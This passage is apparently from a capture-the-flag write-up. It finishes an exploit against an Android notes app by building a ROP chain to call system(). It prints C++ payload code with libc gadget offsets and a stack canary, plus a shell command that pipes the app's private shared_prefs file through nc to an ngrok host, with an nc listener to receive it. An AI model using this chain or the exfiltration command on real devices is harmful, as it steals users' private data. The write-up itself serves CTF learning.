To avoid the hassle with NATs, we will use [ngrok](https://ngrok.com/). So, we spawn one terminal with `ngrok tcp 5000` and another with `nc -lnvp 5000`. We will execute the below command in the context of the victim application via a ROP chain:

```bash
cat /data/user/0/com.inso.ins24/shared_prefs/com.inso.ins24.mynotes.xml | \
    nc <ngrok pub ip> <ngrok pub port>
```

### Building a ROP chain

We have control of `pc` and a libc leak. So, it is now just a matter of finding the correct gadgets to invoke `system(cmd)`. When we are at `get_algo+0xa9: pc=ret;`, this is how the registers look like:

```asm
$rax   : 0x000077031bb80a10  →  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
$rsi   : 0x000077031bb80910  →  0x00007704f8927f00  →  0x00000000005c0000
$rdi   : 0x000077031bb80900  →  0x00007703005c0000
$r8    : 0x000077031bb808f8  →  0x00007703e8914460  →  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
$r9    : 0x60
$r12   : 0x000077031bb80d40  →  0x000077031bb81090  →  0x000077031bb812e0  →  0x000077031bb81470  →  0x000077031bb815f0  →  0x000077031bb81810  →  0x0000000000000000
$r14   : 0x000077031bb80f90  →  0x0000000000000000
```

`$rax` points to our payload buffer (return value) on the stack. `$rdi` is also pointing in the stack. How convenient for `$rdi`! We will add some constants to `$rdi` so that we make it point to our `cmd` buffer in the stack and then invoke `system(cmd)`. Using [ropper](https://github.com/sashs/Ropper) it was easy to find the gadget `add rdi, 0x90; mov rax, qword ptr [rdi]; pop rbx; ret;` in libc.

So, here is our final payload:

```c++
// cpp/main.cpp

uint64_t gadget__add_rdi_0x90 = libc_base+0x00000000000cae06; // 0x00000000000cae06: add rdi, 0x90; mov rax, qword ptr [rdi]; pop rbx; ret;
uint64_t gadget__noop         = libc_base+0x000000000007a60a; // 0x000000000007a60a: ret;
uint64_t system__addr         = libc_base + 0x6f190; // system@@LIBC

char *payload = static_cast<char *>(calloc(0x1000, sizeof(char)));
size_t payload_len = 0;

for(int i=0; i<56; i++) {
    write_u8(payload, &payload_len, 0x41); //padding
}
write_u64(payload, &payload_len, canary);
write_u64(payload, &payload_len, 0x4242424242424242); //rbp

write_u64(payload, &payload_len, gadget__add_rdi_0x90); //pc
write_u64(payload, &payload_len, 0x4141414141414141); //pop rbx

write_u64(payload, &payload_len, gadget__add_rdi_0x90); //pc
write_u64(payload, &payload_len, 0x4141414141414141); //pop rbx

write_u64(payload, &payload_len, gadget__add_rdi_0x90); //pc
write_u64(payload, &payload_len, 0x4141414141414141); //pop rbx
write_u64(payload, &payload_len, gadget__noop); //pc. stack-alignment fix for movaps

write_u64(payload, &payload_len, system__addr); //pc
ALOGI("Payload len until pop pc=system; 0x%zx", payload_len);

while(payload_len < 0xA0) {
    write_u8(payload, &payload_len, 0x41); //padding
}

//terminal1: ngrok tcp 5000
//terminal2: nc -lnvp 5000
const char *ngrok_pub_addr = "4.tcp.eu.ngrok.io";
const int ngrok_pub_port = 14991;
std::string cmd =
    std::string("cat /data/user/0/com.inso.ins24/shared_prefs/com.inso.ins24.mynotes.xml | nc ") +
    std::string(ngrok_pub_addr) + std::string(" ") + std::to_string(ngrok_pub_port);
ALOGI("Using command: %s", cmd.c_str());
write_string(payload, &payload_len, cmd.c_str());
```

Finally, we run our application, send the malicious the Intent, and receive the flag in our ngrok callback!

![flag](/post-resources/cryptonotes/flag.png)
